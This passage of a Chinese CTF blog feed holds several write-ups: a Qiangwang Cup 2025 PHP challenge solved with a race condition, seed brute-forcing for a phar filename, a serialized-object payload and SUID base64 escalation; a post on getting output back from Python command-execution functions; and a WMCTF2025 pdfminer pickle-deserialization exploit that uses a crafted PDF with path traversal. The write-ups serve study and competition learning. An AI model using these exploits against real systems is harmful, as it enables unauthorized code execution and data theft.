class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>                    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>                    <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br>                    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><br>                    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br>                    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&#x27;*&#x27;</span>);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                    &#125;<br><br>                    <span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>                    <span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br>                    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>                    <span class="hljs-variable">$uploadPath</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cp &quot;</span> . <span class="hljs-variable">$uploadedFile</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$uploadPath</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success upload!&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br><br>                    &#125;<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>检测并include的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/:\/\//&#x27;</span>, <span class="hljs-variable">$file</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br><br>                        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal content detected in the file.&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>在文件上传的时候会先删除uploads目录的文件，然后再cp到uploads目录</p><p>因为同一分钟类，文件名是相同的，那么我们就可以尝试条件竞争了</p><p>thread1上传文件 –&gt; thread1清空目录 –&gt; thread1写入文件 –&gt; thread2上传文件 –&gt; thread2清空目录 –&gt; thread1内容检测 –&gt; thread1检测通过 –&gt; thread2写入文件 –&gt; thread1文件包含</p><p><strong>思路二</strong>：phar+gzip压缩</p><p>参考文章：<a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/</a></p><p>phar非常灵活，只要你有phar文件头，并且你的文件名有.phar字符串（不需要在尾部），php就可以把这个文件当成phar解析，并且是可以压缩的，压缩之后就没有&lt;?php了，显然可以绕过内容检测，所以唯一的问题是怎么让文件名包含.phar</p><p>分析一下文件名的设置逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br><span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br></code></pre></td></tr></table></figure><p>文件名是time.randomstr.jpg的格式</p><p>显然只需要让randomstr里面包含phar就行了，因为php的随机数是伪随机，这里的种子是我们可控的，所以我们可以找出哪个种子能生成包含phar的字符串</p><p>种子的构成是当前小时和分钟数+转成int之后全局的filename变量</p><p>而全局的filename变量的值是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag;<br></code></pre></td></tr></table></figure><p>readflag属性又是可控的</p><p>所以我们只需要将爆出来的种子传给readflag，在析构的时候就可以传到filename变量，这里可以写一个非常简单的脚本来爆破一下,直接借鉴一下大佬的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilename</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>        <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>    &#125;<br>    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$filename</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$filename</span> &lt; <span class="hljs-number">2000000000</span>; <span class="hljs-variable">$filename</span>++) &#123;<br>        <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$s</span>, <span class="hljs-string">&#x27;phar&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;found: filename=<span class="hljs-subst">$filename</span> seed=<span class="hljs-subst">$seed</span> =&gt; <span class="hljs-subst">$s</span>\n&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$filename</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">getFilename</span>());<br><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">found: <span class="hljs-attribute">filename</span>=18112 <span class="hljs-attribute">seed</span>=110718112 =&gt; pharktae<br>18112<br></code></pre></td></tr></table></figure><p>注意设置时区，以我当前的时间为例，爆出来是18112，于是生成序列化数据的时候</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;18112&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>对于最后一步的提权就是一个非常简单的suid提权，base64有s权限，直接执行base64 &#x2F;flag就行了</p><h1 id="总结与反思"><a href="/2025/10/21/强网杯2025wp/#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><p>php十分灵活，有各种各样的用法，做这种题比较考验耐心。这次比赛也让我对要审源码的题有了一点点体会</p><p><del>虽然没出</del></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于python中命令执行函数的返回值的研究</title>
    <link href="/2025/10/14/%E5%85%B3%E4%BA%8Epython%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2025/10/14/%E5%85%B3%E4%BA%8Epython%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#前言" class="headerlink" title="前言"></a>前言</h1><p>事情的开始是在做一道ctf题目的时候发现会返回一个数字，比如0，512 …</p><p>分析了一下发现其实是python的os.system执行命令之后返回的状态码，于是我就想到能否利用这个返回值来带出数据呢，于是我进行了对各种命令执行函数的探索</p><h1 id="各种命令执行函数"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#各种命令执行函数" class="headerlink" title="各种命令执行函数"></a>各种命令执行函数</h1><h2 id="os-system"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#os-system" class="headerlink" title="os.system"></a>os.system</h2><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014193632120.png" alt="image-20251014193632120"></p><p>可以看到在命令执行之后会返回一个数字0，0其实就是表示命令执行成功</p><p>如果失败会返回什么呢？我们来执行一个windows中没有的命令</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014193742216.png" alt="image-20251014193742216"></p><p>返回了1</p><p>对于为什么会返回这些值，我去查看了python的源码</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014195108166.png" alt="image-20251014195108166"></p><p>linux上面的的返回结果与windows有一点区别，但是如果是执行成功的话都是返回0</p><p>这些整数显然是命令执行的状态码，用来判断命令执行是否正常</p><p>由于返回值不可控，所以无法利用他来带出数据</p><h2 id="os-popen"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#os-popen" class="headerlink" title="os.popen"></a>os.popen</h2><p>想要带出输出，不难想到使用popen函数，他的功能是执行命令并通过文件对象接口获取输出，配合上read()就能捕获到命令执行的结果</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014195657210.png" alt="image-20251014195657210"></p><p>显然这个是可以帮助我们带出数据的</p><h2 id="subprocess-run"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#subprocess-run" class="headerlink" title="subprocess.run"></a>subprocess.run</h2><p>subprocess.run函数的返回值是一个对象</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014202046958.png" alt="image-20251014202046958"></p><p>参数列表中有一个参数是capture_output，默认值为False，不会捕获输出，当我们将其设置为true的时候，就能捕获到输出</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014202027844.png" alt="image-20251014202027844"></p><p>同样也可以用来带出数据</p><h2 id="subprocess-getoutput"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a>subprocess.getoutput</h2><p>注意到subprocess中有一个函数</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014202358814.png" alt="image-20251014202358814"></p><p>这个函数的返回值就是执行命令的输出，完全符合我们的目的</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014202515246.png" alt="image-20251014202515246"></p><p>直接就可以带出数据</p><h2 id="subprocess-getstatusoutput"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#subprocess-getstatusoutput" class="headerlink" title="subprocess.getstatusoutput"></a>subprocess.getstatusoutput</h2><p>返回命令执行的状态码和执行结果</p><p><img src="/2025/10/14/关于python中命令执行函数的返回值的研究/image-20251014202727404.png" alt="image-20251014202727404"></p><h1 id="总结"><a href="/2025/10/14/关于python中命令执行函数的返回值的研究/#总结" class="headerlink" title="总结"></a>总结</h1><p>暂时没有想到有什么利用场景，但是感觉探索的过程蛮有意思的，随便记录一下啦</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>命令执行函数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025</title>
    <link href="/2025/09/23/WMCTF2025/"/>
    <url>/2025/09/23/WMCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/09/23/WMCTF2025/#前言" class="headerlink" title="前言"></a>前言</h1><p>本题的功能点是一个将pdf转换为txt的网站，修复方式是把pickle换成了marshal</p><h1 id="分析调用链"><a href="/2025/09/23/WMCTF2025/#分析调用链" class="headerlink" title="分析调用链"></a>分析调用链</h1><p>这题考察pickle反序列化，首先在pdfminer库里搜索pickle.loads</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_load_data</span>(<span class="hljs-params">cls, name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:<br>    name = name.replace(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    filename = <span class="hljs-string">&quot;%s.pickle.gz&quot;</span> % name<br>    log.debug(<span class="hljs-string">&quot;loading: %r&quot;</span>, name)<br>    cmap_paths = (<br>        os.environ.get(<span class="hljs-string">&quot;CMAP_PATH&quot;</span>, <span class="hljs-string">&quot;/usr/share/pdfminer/&quot;</span>),<br>        os.path.join(os.path.dirname(__file__), <span class="hljs-string">&quot;cmap&quot;</span>),<br>    )<br>    <span class="hljs-keyword">for</span> directory <span class="hljs-keyword">in</span> cmap_paths:<br>        path = os.path.join(directory, filename)<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            gzfile = gzip.<span class="hljs-built_in">open</span>(path)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(name), (), pickle.loads(gzfile.read()))<br>            <span class="hljs-keyword">finally</span>:<br>                gzfile.close()<br>    <span class="hljs-keyword">raise</span> CMapDB.CMapNotFound(name)<br></code></pre></td></tr></table></figure><p>这里反序列化的数据是默认的cmap目录下的文件，如果能让他变成我们可控的文件就能够实现rce</p><p>注意到path里面的filename是我们可控的，如果能目录穿越到我们可控的目录就可以了，往上寻找看看是从哪里调用过来的</p><p><img src="/2025/09/23/WMCTF2025/image-20250923130848407.png" alt="image-20250923130848407"></p><p>发现有两个地方调用了_load_data函数，但是get_unicode_map 调用的时候前缀是写死的无法进行目录穿越</p><p>所以只能是get_cmap,继续看</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131155099.png" alt="image-20250923131155099"></p><p>找到这里，再继续看get_cmap_from_spec</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131249192.png" alt="image-20250923131249192"></p><p>是PDFCIDFont类初始化的时候调用的，继续看</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131416719.png" alt="image-20250923131416719"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131448101.png" alt="image-20250923131448101"></p><p>其实到这里已经很明显了，就是在处理CIDFont字体的时候调用的，但是还是继续看完</p><p><img src="/2025/09/23/WMCTF2025/image-20250923131557145.png" alt="image-20250923131557145"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131620302.png" alt="image-20250923131620302"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131635382.png" alt="image-20250923131635382"></p><p><img src="/2025/09/23/WMCTF2025/image-20250923131648622.png" alt="image-20250923131648622"></p><p>找到了入口函数extract_pages</p><p>那么整个过程就清晰了，就是当一页pdf里面存在CIDFont字体的时候就会实例化一个PDFCIDFont对象来处理，最后调到了pcikle.loads</p><p><img src="/2025/09/23/WMCTF2025/image-20250923132114656.png" alt="image-20250923132114656"></p><p>这个函数中可以看到，name是通过Encoding获取的，所以我们只要在pdf中插入一个CIDFont字体并且指定Encoding就可以反序列化我们可控的文件</p><h1 id="构造恶意文件"><a href="/2025/09/23/WMCTF2025/#构造恶意文件" class="headerlink" title="构造恶意文件"></a>构造恶意文件</h1><p>pdf直接让ai生成就行了，再自己改一下Encoding  （帮我生成一个简单的pdf文件，声明CIDFont字体，以纯文本形式输出）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">%PDF-1.4<br>1 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Catalog</span><br>  <span class="hljs-string">/Pages</span> 2 0 R<br>&gt;&gt;<br>endobj<br><br>2 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Pages</span><br>  <span class="hljs-string">/Count</span> 1<br>  <span class="hljs-string">/Kids</span> [3 0 R]<br>&gt;&gt;<br>endobj<br><br>3 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Page</span><br>  <span class="hljs-string">/Parent</span> 2 0 R<br>  <span class="hljs-string">/MediaBox</span> [0 0 595 842]<br>  <span class="hljs-string">/Resources</span> &lt;&lt;<br>    <span class="hljs-string">/Font</span> &lt;&lt;<br>      <span class="hljs-string">/F1</span> 4 0 R<br>    &gt;&gt;<br>  &gt;&gt;<br>  <span class="hljs-string">/Contents</span> 5 0 R<br>&gt;&gt;<br>endobj<br><br>4 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/Type0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/Encoding</span> <span class="hljs-string">/..</span><span class="hljs-comment">#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fpickle</span><br>  <span class="hljs-string">/DescendantFonts</span> [6 0 R]<br>&gt;&gt;<br>endobj<br><br>6 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/CIDFontType0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/CIDSystemInfo</span> &lt;&lt;<br>    <span class="hljs-string">/Registry</span> <span class="hljs-params">(Adobe)</span><br>    <span class="hljs-string">/Ordering</span> <span class="hljs-params">(GB1)</span><br>    <span class="hljs-string">/Supplement</span> 0<br>  &gt;&gt;<br>&gt;&gt;<br>endobj<br><br>5 0 obj<br>&lt;&lt; <span class="hljs-string">/Length</span> 32 &gt;&gt;<br>stream<br>BT<br><span class="hljs-string">/F1</span> 24 Tf<br>100 700 Td<br><span class="hljs-params">(A)</span> Tj<br>ET<br>endstream<br>endobj<br><br>xref<br>0 7<br>0000000000 65535 f<br>0000000010 00000 n<br>0000000058 00000 n<br>0000000115 00000 n<br>0000000252 00000 n<br>0000000375 00000 n<br>0000000534 00000 n<br>trailer<br>&lt;&lt;<br>  <span class="hljs-string">/Root</span> 1 0 R<br>  <span class="hljs-string">/Size</span> 7<br>&gt;&gt;<br>startxref<br>620<br>%%EOF<br><br></code></pre></td></tr></table></figure><p>注意这里&#x2F;要16进制编码一下，反序列化的文件就变成了&#x2F;app&#x2F;uploads&#x2F;pickle.pickle.gz</p><p>我们只需要把序列化后的数据存到这个gz文件里就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span 